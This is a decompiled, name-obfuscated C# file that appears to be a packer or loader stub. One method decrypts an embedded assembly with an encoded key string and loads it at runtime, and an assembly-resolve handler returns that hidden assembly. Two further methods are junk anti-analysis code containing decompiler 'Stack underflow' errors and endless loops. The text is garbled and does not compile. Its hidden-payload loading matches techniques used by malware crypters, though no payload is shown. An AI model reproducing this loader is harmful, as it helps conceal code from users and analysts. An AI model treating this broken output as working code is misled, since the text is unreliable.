using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using ns0;
using ns2;

namespace ns1;

internal sealed class Class0
{
	public static Assembly smethod_0(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		if (Class1.smethod_3(resolveEventArgs_0))
		{
			return null;
		}
		return GClass0.assembly_0;
	}

	public static MethodBase smethod_1(BindingFlags bindingFlags_0, MethodBase[] methodBase_0, Type[] type_0, ParameterModifier[] parameterModifier_0)
	{
		Type[] array = new Type[type_0.Length];
		for (int i = 0; i < type_0.Length; i++)
		{
			array[i] = type_0[i].UnderlyingSystemType;
		}
		type_0 = array;
		int num = 0;
		for (int j = 0; j < methodBase_0.Length; j++)
		{
			ParameterInfo[] parameters = methodBase_0[j].GetParameters();
			if (parameters.Length != type_0.Length)
			{
				continue;
			}
			int k;
			for (k = 0; k < type_0.Length; k++)
			{
				Type parameterType = parameters[k].ParameterType;
				if (parameterType != type_0[k] && parameterType != typeof(object) && !parameterType.IsPrimitive && !parameterType.IsAssignableFrom(type_0[k]))
				{
					break;
				}
			}
			if (k == type_0.Length)
			{
				methodBase_0[num++] = methodBase_0[j];
			}
		}
		switch (num)
		{
		case 0:
			return null;
		case 1:
			return methodBase_0[0];
		default:
		{
			int num2 = 0;
			int[] array2 = new int[type_0.Length];
			for (int l = 0; l < type_0.Length; l++)
			{
				array2[l] = l;
			}
			for (int m = 1; m < num; m++)
			{
			}
			return methodBase_0[num2];
		}
		}
	}

	internal static void smethod_2()
	{
		GClass0.assembly_0 = GClass0.appDomain_0.Load(Class1.smethod_4(Class3.smethod_0(), Class1.smethod_1("g}Îd-û9δß┌")));
	}

	static void smethod_3()
	{
		try
		{
		}
		finally
		{
			_003CModule_003E _003CModule_003E = _003CModule_003E;
			_003CModule_003E = null;
			Settings settings = null;
			settings = settings;
			goto IL_000d;
		}
		IL_000d:
		try
		{
		}
		finally
		{
			goto IL_0012;
		}
		IL_0012:
		_003CPrivateImplementationDetails_003E _003CPrivateImplementationDetails_003E = (_003CPrivateImplementationDetails_003E)/*Error near IL_0013: Stack underflow*/;
		_003CPrivateImplementationDetails_003E = _003CPrivateImplementationDetails_003E;
		try
		{
		}
		catch
		{
		}
		try
		{
			System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag);
			while (flag = flag)
			{
			}
		}
		finally
		{
			goto IL_0024;
		}
		IL_0024:
		while (true)
		{
		}
	}

	static void smethod_4()
	{
		//IL_000c: Expected O, but got I8
		byte b = b;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out byte b2);
		b = b2;
		b = (byte)/*Error near IL_0006: Stack underflow*/;
		_ = long.Parse((string)/*Error near IL_000b: Stack underflow*/) is void;
		while (true)
		{
		}
	}
}
